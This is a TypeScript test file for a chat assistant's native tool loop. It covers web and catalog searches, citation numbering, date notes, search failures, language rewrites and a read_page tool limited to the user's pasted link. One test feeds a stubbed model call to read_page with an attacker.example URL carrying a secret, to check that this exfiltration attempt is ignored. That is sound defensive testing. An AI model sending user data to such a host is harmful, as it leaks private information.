// A native turn's tool loop, driven through the real endpoint with a stubbed fetch and fake
// retrieval engines. The contract: the model sees every tool it may call, each search's evidence goes
// back as the tool message, citation numbers continue across searches so [n] means one source for the
// whole turn, and the sources reach the stream so the UI can show and persist them. (CUR-2420)
import { describe, it, expect, vi, afterEach } from "vitest";
import { SEARCH_RESULTS_ARE_NOT_THE_CONVERSATION } from "../search/webEvidence";

vi.mock("$lib/chat/server/logger", () => ({
	logger: { warn: vi.fn(), info: vi.fn(), error: vi.fn(), debug: vi.fn(), trace: vi.fn(), fatal: vi.fn() },
}));
vi.mock("$lib/chat/server/flags", () => ({
	flagEnabledOr: (_k: string, fallback: () => boolean) => fallback(),
	ensureFlagsPolled: async () => {},
	flagsDebugState: () => ({ polledOk: true, lastRefreshAt: 0, size: 1 }),
}));

const { endpointOai } = await import("../endpoints/openai/endpointOai");
const { nativeToolKit } = await import("./nativeTools");
const { logger } = await import("$lib/chat/server/logger");

const MODEL = "mistral-large-2512";
function sse(chunks: Array<{ delta: Record<string, unknown>; finish?: string | null }>): string {
	return (
		chunks
			.map(
				({ delta, finish = null }) =>
					`data: ${JSON.stringify({ id: "c", object: "chat.completion.chunk", created: 0, model: MODEL, choices: [{ index: 0, delta, finish_reason: finish }] })}\n\n`
			)
			.join("") + "data: [DONE]\n\n"
	);
}
const call = (name: string, args: object, id: string) =>
	sse([
		{
			delta: {
				role: "assistant",
				content: "",
				tool_calls: [{ id, index: 0, type: "function", function: { name, arguments: JSON.stringify(args) } }],
			},
			finish: "tool_calls",
		},
	]);
const answer = (text: string) => sse([{ delta: { role: "assistant", content: text } }, { delta: {}, finish: "stop" }]);

function stub(bodies: string[]) {
	const sent: Array<Record<string, unknown>> = [];
	let i = 0;
	vi.stubGlobal(
		"fetch",
		vi.fn(async (_u: unknown, init?: RequestInit) => {
			sent.push(JSON.parse(String(init?.body ?? "{}")));
			return new Response(bodies[Math.min(i++, bodies.length - 1)], {
				status: 200,
				headers: { "content-type": "text/event-stream" },
			});
		})
	);
	return sent;
}

const src = (n: number, url: string) => ({ n, title: url, url, snippet: "s", engine: "Wikipedia" as const });
function engines() {
	const seen: Array<{ engine: string; query: string; startAt: number }> = [];
	return {
		seen,
		web: vi.fn(async (query: string, o: { startAt?: number }) => {
			seen.push({ engine: "web", query, startAt: o.startAt ?? 0 });
			const sources = [src((o.startAt ?? 0) + 1, "https://w/1"), src((o.startAt ?? 0) + 2, "https://w/2")];
			return { query, sources, evidence: `WEB EVIDENCE for ${query}`, asOf: "2026-09-30", relevanceVerified: true };
		}),
		catalog: vi.fn(async (query: string, _l: unknown, startAt = 0) => {
			seen.push({ engine: "catalog", query, startAt });
			return {
				query,
				sources: [{ n: startAt + 1, title: "Proj", url: "https://c/1", snippet: "c" }],
				evidence: `CATALOG EVIDENCE for ${query}`,
				asOf: "2026-09-30",
				relevanceVerified: true,
			};
		}),
	};
}

async function run(kit: ReturnType<typeof nativeToolKit>) {
	const endpoint = await endpointOai({
		type: "openai",
		baseURL: "https://api.mistral.ai/v1",
		apiKey: "sk-test",
		model: { id: MODEL, name: MODEL, parameters: {}, supportsTools: true },
	});
	const stream = await endpoint({
		messages: [{ from: "user", content: "what's new with project X?" }],
		locals: undefined,
		servesUserAnswer: true,
		nativeTools: kit,
	} as Parameters<typeof endpoint>[0]);
	const outputs = [];
	for await (const o of stream) outputs.push(o);
	return outputs;
}

afterEach(() => vi.unstubAllGlobals());

describe("a native turn offers its tools and runs the ones the model calls", () => {
	it("offers web_search, search_catalog, calculate and current_datetime when search is on", async () => {
		const e = engines();
		const sent = stub([answer("hi")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toEqual(["web_search", "search_catalog", "calculate", "current_datetime"]);
		expect(sent[0].tool_choice).toBe("auto");
	});
	it("withholds web_search when search is off, and keeps catalog, calculate and current_datetime", async () => {
		const sent = stub([answer("hi")]);
		await run(nativeToolKit({ locals: undefined, web: false, engines: engines() as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toEqual(["search_catalog", "calculate", "current_datetime"]);
	});
	it("withholds web_search, and forces no search, for a live value no source here carries, even with search 'always' (CUR-2697)", async () => {
		const sent = stub([call("web_search", { query: "score now" }, "c1"), answer("ok")]);
		const e = engines();
		await run(nativeToolKit({ locals: undefined, web: true, forceWeb: true, liveUnservable: true, engines: e as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).not.toContain("web_search");
		expect(names).toContain("search_catalog");
		expect(sent[0].tool_choice).not.toEqual({ type: "function", function: { name: "web_search" } });
		expect(e.web).not.toHaveBeenCalled();
	});

	it("forces the first round to web_search when search is 'always'", async () => {
		const sent = stub([answer("hi")]);
		await run(nativeToolKit({ locals: undefined, web: true, forceWeb: true, engines: engines() as never }));
		expect(sent[0].tool_choice).toEqual({ type: "function", function: { name: "web_search" } });
	});
});

describe("citation numbers are one namespace across every search in the turn", () => {
	it("numbers our sources after the person's own pasted [1]..[k] (CUR-3844)", async () => {
		const e = engines();
		stub([call("web_search", { query: "project X news" }, "c1"), answer("X shipped [3].")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, visitorSourceCount: 2 }));
		expect(e.seen).toEqual([{ engine: "web", query: "project X news", startAt: 2 }]);
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.webSearch?.sources.map((s) => s.n)).toEqual([3, 4]);
	});
	it("numbers the second search after the first, sends each evidence back, and streams the sources", async () => {
		const e = engines();
		const sent = stub([
			call("search_catalog", { query: "project X" }, "c1"),
			call("web_search", { query: "project X news" }, "c2"),
			answer("X shipped [3]."),
		]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));

		expect(e.seen).toEqual([
			{ engine: "catalog", query: "project X", startAt: 0 },
			{ engine: "web", query: "project X news", startAt: 1 },
		]);
		const toolMsgs = (sent[2].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");
		const note = (range: string) =>
			`\n\n${SEARCH_RESULTS_ARE_NOT_THE_CONVERSATION} Cite each fact you take from these sources inline by its number (${range}), right after the sentence that uses it.`;
		expect(toolMsgs.map((m) => m.content)).toEqual([
			"CATALOG EVIDENCE for project X" + note("[1]"),
			expect.stringMatching(/^WEB EVIDENCE for project X news/),
		]);
		// A web result also ends with today's date (CUR-4163, its own test below).
		expect(toolMsgs[1].content.startsWith("WEB EVIDENCE for project X news" + note("[2] to [3]") + "\n\nToday is ")).toBe(true);
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.rag?.sources.map((s) => s.n)).toEqual([1]);
		expect(last?.webSearch?.sources.map((s) => s.n)).toEqual([2, 3]);
		expect(outputs.find((o) => o.generated_text)?.generated_text).toBe("X shipped [3].");
	});
	it("ends a web result with today's date in the person's zone, so a source's date never stands in for today (CUR-4163)", async () => {
		vi.useFakeTimers({ toFake: ["Date"] });
		vi.setSystemTime(new Date("2026-10-18T01:35:00Z"));
		try {
			const sent = stub([call("web_search", { query: "today's date in Auckland" }, "c1"), answer("ok")]);
			await run(nativeToolKit({ locals: { timezone: "Pacific/Auckland" } as never, web: true, engines: engines() as never }));
			const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
			expect(tool?.content).toContain("Today is Sunday, 18 October 2026 (Pacific/Auckland)");
			expect(tool?.content).toContain("A date shown in a source is that page's own date, not today's");
			// On a Sunday a model can name the day before as this coming Saturday (CUR-4164).
			expect(tool?.content).toContain("The next Saturday after today is Saturday, 24 October 2026");
		} finally {
			vi.useRealTimers();
		}
	});
	it("gives a web result the UTC clock beside the person's date, so another place's date is never the person's day (CUR-4163)", async () => {
		vi.useFakeTimers({ toFake: ["Date"] });
		// Los Angeles still on Tuesday, Auckland already on Wednesday.
		vi.setSystemTime(new Date("2026-10-21T01:52:00Z"));
		try {
			const sent = stub([call("web_search", { query: "today's date in Auckland" }, "c1"), answer("ok")]);
			await run(nativeToolKit({ locals: { timezone: "America/Los_Angeles" } as never, web: true, engines: engines() as never }));
			const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
			expect(tool?.content).toContain("Today is Tuesday, 20 October 2026 (America/Los_Angeles)");
			expect(tool?.content).toContain("the time now in UTC, Wednesday, 21 October 2026, 01:52 UTC");
			expect(tool?.content).toContain("never from the person's date or a source");
		} finally {
			vi.useRealTimers();
		}
	});
	it("tells the model nothing was found, and numbers nothing, when a search comes back empty", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce({ query: "q", sources: [], evidence: "", asOf: "", relevanceVerified: true });
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("nothing")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/No sources found/);
		expect(outputs.some((o) => o.toolSources)).toBe(false);
	});
	// A search that did not finish is not one that found nothing, to the model or to the visitor. (CUR-4091)
	it("tells the model the search didn't finish, and streams that it failed, when the search times out", async () => {
		const e = engines();
		e.web.mockImplementationOnce(async (_q: string, o: { startAt?: number }) => {
			(o as { onFailed?: (w: string) => void }).onFailed?.("timeout");
			return undefined as never;
		});
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("from memory")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/did not finish/);
		expect(outputs.filter((o) => o.toolSources).map((o) => o.toolSources)).toEqual([{ searchFailed: "timeout" }]);
	});
	// Without this line nothing records an engine's time or failure on a native turn. (CUR-4282)
	it("logs each search's per-engine time, including one the reranker rejected and one that failed", async () => {
		const e = engines();
		const timings = { enginesMs: 900, engineMs: { Firecrawl: 850, Wikipedia: 200 }, rerankMs: 40, enrichMs: 0 };
		e.web.mockImplementationOnce(async (query: string) => ({
			query, sources: [src(1, "https://w/1")], evidence: "E", asOf: "2026-10-24", relevanceVerified: false, timings,
		}) as never);
		e.web.mockImplementationOnce(async (_q: string, o: { startAt?: number }) => {
			(o as { onFailed?: (w: string) => void }).onFailed?.("timeout");
			return undefined as never;
		});
		stub([call("web_search", { query: "a" }, "c1"), call("web_search", { query: "b" }, "c2"), answer("ok")]);
		vi.mocked(logger.info).mockClear();
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const lines = vi.mocked(logger.info).mock.calls.filter((c) => c[1] === "[native] web_search timing").map((c) => c[0]);
		expect(lines).toEqual([
			{ webMs: timings, sources: 1, verified: false, failed: undefined },
			{ webMs: undefined, sources: 0, verified: false, failed: "timeout" },
		]);
	});
	it("streams no failure once a later search in the turn grounds it", async () => {
		const e = engines();
		e.web.mockImplementationOnce(async (_q: string, o: { startAt?: number }) => {
			(o as { onFailed?: (w: string) => void }).onFailed?.("error");
			return undefined as never;
		});
		stub([call("web_search", { query: "q" }, "c1"), call("web_search", { query: "q2" }, "c2"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const last = outputs.filter((o) => o.toolSources).at(-1)?.toolSources;
		expect(last?.searchFailed).toBeUndefined();
		expect(last?.webSearch?.sources.length).toBe(2);
	});
	it("grounds on no web result the reranker did not verify, as the scaffolded path's gate does", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce({
			query: "q",
			sources: [src(1, "https://w/unvetted")],
			evidence: "UNVETTED EVIDENCE",
			asOf: "2026-09-30",
			relevanceVerified: false,
		});
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("nothing")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/No sources found/);
		expect(tool?.content).not.toContain("UNVETTED EVIDENCE");
		expect(outputs.some((o) => o.toolSources)).toBe(false);
	});
	it("refuses a web search the kit did not offer rather than running it", async () => {
		const e = engines();
		const sent = stub([call("web_search", { query: "q" }, "c1"), answer("ok")]);
		await run(nativeToolKit({ locals: undefined, web: false, engines: e as never }));
		expect(e.web).not.toHaveBeenCalled();
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/no tool named web_search/);
	});
});

// The live line under a native turn. The scaffolded path says "Searching the web…" from its
// search gate; a native turn has no gate, so each tool round announces what it is about to retrieve. (CUR-2275)
describe("each tool round says what it retrieves before it runs, and never claims a web search it did not run", () => {
	it("announces the web before web_search runs, ahead of the sources it finds", async () => {
		stub([call("web_search", { query: "q" }, "c1"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }));
		const announced = outputs.findIndex((o) => o.toolRetrieval);
		expect(outputs[announced]?.toolRetrieval).toBe("web");
		expect(announced).toBeLessThan(outputs.findIndex((o) => o.toolSources));
	});
	it("says documents, not the web, for a round that only searches the catalog", async () => {
		stub([call("search_catalog", { query: "q" }, "c1"), answer("ok [1]")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }));
		expect(outputs.flatMap((o) => (o.toolRetrieval ? [o.toolRetrieval] : []))).toEqual(["documents"]);
	});
	it("says nothing about the web when the model calls a web_search the kit withheld", async () => {
		stub([call("web_search", { query: "q" }, "c1"), answer("ok")]);
		const outputs = await run(nativeToolKit({ locals: undefined, web: false, engines: engines() as never }));
		expect(outputs.some((o) => o.toolRetrieval)).toBe(false);
	});
	it("names both when one round searches the catalog and the web", () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never });
		const c = (name: string) => ({ id: name, name, arguments: "{}" });
		expect(kit.retrievalOf?.([c("search_catalog"), c("web_search")])).toBe("documents-web");
		expect(kit.retrievalOf?.([c("calculate")])).toBeUndefined();
	});
});

// A pasted link is read on a native turn the way the scaffolded path reads it (CUR-1897). The
// one URL that may be fetched is the one the person typed (linkedUrl.ts), so read_page has no URL
// argument and opens that link whatever the model passes. (CUR-2734)
describe("a link the person pasted is opened first, and it is the only page read_page can open", () => {
	const PASTED = "https://example.org/report";
	const page = { title: "Report", url: PASTED, snippet: "The survey had 3,513 people.", engine: "Linked page" };
	function reader() {
		const opened: string[] = [];
		return { opened, read: vi.fn(async (url: string) => (opened.push(url), page as never)) };
	}

	it("offers read_page and forces the first round to it, ahead of a forced web search", async () => {
		const sent = stub([answer("hi")]);
		const r = reader();
		await run(
			nativeToolKit({ locals: undefined, web: true, forceWeb: true, linkedUrl: PASTED, readPage: r.read, engines: engines() as never })
		);
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).toContain("read_page");
		expect(sent[0].tool_choice).toEqual({ type: "function", function: { name: "read_page" } });
	});

	it("reads the pasted link as source [1], tells the model to cite it, and announces a web read", async () => {
		const sent = stub([call("read_page", {}, "c1"), answer("3,513 people [1].")]);
		const r = reader();
		const outputs = await run(
			nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: r.read, engines: engines() as never })
		);
		expect(r.opened).toEqual([PASTED]);
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toContain("3,513");
		expect(tool?.content).toMatch(/source \[1\]/);
		expect(outputs.filter((o) => o.toolSources).at(-1)?.toolSources?.webSearch?.sources.map((s) => s.url)).toEqual([PASTED]);
		expect(outputs.find((o) => o.toolRetrieval)?.toolRetrieval).toBe("web");
	});

	it("opens the pasted link even when the model passes another URL", async () => {
		stub([call("read_page", { url: "https://attacker.example/collect?q=secret" }, "c1"), answer("ok")]);
		const r = reader();
		await run(nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: r.read, engines: engines() as never }));
		expect(r.opened).toEqual([PASTED]);
	});

	it("tells the model the page could not be read, rather than nothing, when the reader returns none", async () => {
		const sent = stub([call("read_page", {}, "c1"), answer("ok")]);
		await run(
			nativeToolKit({
				locals: undefined,
				web: true,
				linkedUrl: PASTED,
				readPage: vi.fn(async () => undefined),
				engines: engines() as never,
			})
		);
		const tool = (sent[1].messages as Array<{ role: string; content: string }>).find((m) => m.role === "tool");
		expect(tool?.content).toMatch(/could not read the page/);
	});

	it("answers a web search after the page was read with the page-only note, running no search, as the scaffolded turn grounds on the page alone (CUR-2697)", async () => {
		const sent = stub([call("read_page", {}, "c1"), call("web_search", { query: "survey size" }, "c2"), answer("ok")]);
		const e = engines();
		const outputs = await run(nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: reader().read, engines: e as never }));
		expect(e.web).not.toHaveBeenCalled();
		const tools = (sent[2].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");
		expect(tools.at(-1)?.content).toMatch(/has been read and is this turn's source/);
		expect(outputs.filter((o) => o.toolSources).at(-1)?.toolSources?.webSearch?.sources.map((s) => s.url)).toEqual([PASTED]);
	});

	it("still runs a web search after the page could not be read, as the scaffolded turn keeps its results", async () => {
		stub([call("read_page", {}, "c1"), call("web_search", { query: "survey size" }, "c2"), answer("ok")]);
		const e = engines();
		await run(
			nativeToolKit({ locals: undefined, web: true, linkedUrl: PASTED, readPage: vi.fn(async () => undefined), engines: e as never })
		);
		expect(e.web).toHaveBeenCalledTimes(1);
	});

	it("neither offers nor runs read_page with search off", async () => {
		const sent = stub([call("read_page", {}, "c1"), answer("ok")]);
		const r = reader();
		await run(nativeToolKit({ locals: undefined, web: false, linkedUrl: PASTED, readPage: r.read, engines: engines() as never }));
		const names = (sent[0].tools as Array<{ function: { name: string } }>).map((t) => t.function.name);
		expect(names).not.toContain("read_page");
		expect(r.opened).toEqual([]);
	});
});

// What the tools retrieved is kept for checking the answer afterwards (groundcheck), and a
// calculate call is recorded, since its numbers come from code and no source states them. (CUR-2734)
describe("the turn's grounding", () => {
	const callOf = (name: string, args: object) => ({ id: "c", name, arguments: JSON.stringify(args) });

	it("holds every search's evidence and sources, in call order", async () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never });
		await kit.run(callOf("web_search", { query: "peru" }) as never);
		await kit.run(callOf("search_catalog", { query: "apertus" }) as never);
		const g = kit.grounding();
		expect(g.evidence).toEqual(["WEB EVIDENCE for peru", "CATALOG EVIDENCE for apertus"]);
		expect(g.sources.map((s) => s.n)).toEqual([1, 2, 3]);
		expect(g.calculated).toBe(false);
	});

	it("holds nothing from a search that found nothing", async () => {
		const e = engines();
		e.web.mockResolvedValueOnce(undefined as never);
		const kit = nativeToolKit({ locals: undefined, web: true, engines: e as never });
		await kit.run(callOf("web_search", { query: "nothing" }) as never);
		expect(kit.grounding().evidence).toEqual([]);
	});

	it("records that calculate ran", async () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never });
		await kit.run(callOf("calculate", { expression: "2+2" }) as never);
		expect(kit.grounding().calculated).toBe(true);
	});
});

describe("a web search for the latest of something also looks at the past year (CUR-3932)", () => {
	const latestOf = (e: ReturnType<typeof engines>) =>
		(e.web.mock.calls[0]?.[1] as { ctx?: { latest?: boolean } } | undefined)?.ctx?.latest;
	it("marks the search latest when the person asked for the most recent thing, though the model's query dropped it", async () => {
		const e = engines();
		stub([call("web_search", { query: "ECB interest rate decision" }, "c1"), answer("Held [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, latest: true, engines: e as never }));
		expect(latestOf(e)).toBe(true);
	});
	it("marks the search latest when only the model's query asks for the latest", async () => {
		const e = engines();
		stub([call("web_search", { query: "latest ECB interest rate decision" }, "c1"), answer("Held [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(latestOf(e)).toBe(true);
	});
	it("leaves a search that only names a year unmarked: the 2024 election wants 2024's pages", async () => {
		const e = engines();
		stub([call("web_search", { query: "2024 US presidential election winner" }, "c1"), answer("Trump [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(latestOf(e)).toBe(false);
	});
	it("leaves a timeless question's search unmarked", async () => {
		const e = engines();
		stub([call("web_search", { query: "how does the ECB set interest rates" }, "c1"), answer("It votes [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never }));
		expect(latestOf(e)).toBe(false);
	});
});

describe("calculate asks for each group's count before the expression only for a model whose row sets it (CUR-4015)", () => {
	const required = (kit: ReturnType<typeof nativeToolKit>) =>
		(kit.definitions.find((d) => d.function.name === "calculate")?.function.parameters as { required?: string[] }).required;
	it("without calculateCounts, calculate requires the expression alone, as an unlisted model is offered it", () => {
		expect(required(nativeToolKit({ locals: undefined, web: true, engines: engines() as never }))).toEqual(["expression"]);
	});
	it("with calculateCounts, requires counts and expression, and evaluates the expression alone", async () => {
		const kit = nativeToolKit({ locals: undefined, web: true, engines: engines() as never, calculateCounts: true });
		expect(required(kit)).toEqual(["counts", "expression"]);
		const args = { counts: "full-time: 7\nhalf-time: 5", expression: "7 + 5 * 0.5" };
		const out = await kit.run({ id: "c", name: "calculate", arguments: JSON.stringify(args) } as never);
		expect(out.content).toBe("9.5");
		expect(out.calculation).toEqual({ ...args, result: "9.5" });
	});
});

describe("a query in another non-English language than the person's is sent back once for a rewrite (CUR-4376)", () => {
	const langs: Record<string, string> = {
		"diseñador del Park Güell": "spa",
		"dissenyador del Park Güell": "cat",
		"Park Güell designer": "eng",
	};
	const readLanguage = async (t: string) => langs[t];
	const toolMessages = (sent: Array<Record<string, unknown>>, i: number) =>
		(sent[i].messages as Array<{ role: string; content: string }>).filter((m) => m.role === "tool");

	it("sends a Spanish query on a Catalan question back unsearched, then searches the Catalan rewrite", async () => {
		const e = engines();
		const sent = stub([
			call("web_search", { query: "diseñador del Park Güell" }, "c1"),
			call("web_search", { query: "dissenyador del Park Güell" }, "c2"),
			answer("Gaudí [1]."),
		]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, askedLanguage: "cat", readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "dissenyador del Park Güell", startAt: 0 }]);
		expect(toolMessages(sent, 1)[0].content).toBe(
			"No search was run: this query is not in Catalan, the language the person wrote in. Call web_search again with the query written in Catalan."
		);
	});
	it("searches a second mismatched query as written, so a model that keeps its language still gets results", async () => {
		const e = engines();
		stub([
			call("web_search", { query: "diseñador del Park Güell" }, "c1"),
			call("web_search", { query: "diseñador del Park Güell" }, "c2"),
			answer("Gaudí [1]."),
		]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, askedLanguage: "cat", readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "diseñador del Park Güell", startAt: 0 }]);
	});
	it("searches an English query on a Catalan question as written", async () => {
		const e = engines();
		stub([call("web_search", { query: "Park Güell designer" }, "c1"), answer("Gaudí [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, askedLanguage: "cat", readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "Park Güell designer", startAt: 0 }]);
	});
	it("searches the Spanish query as written when no language is set (flag off)", async () => {
		const e = engines();
		stub([call("web_search", { query: "diseñador del Park Güell" }, "c1"), answer("Gaudí [1].")]);
		await run(nativeToolKit({ locals: undefined, web: true, engines: e as never, readLanguage }));
		expect(e.seen).toEqual([{ engine: "web", query: "diseñador del Park Güell", startAt: 0 }]);
	});
});
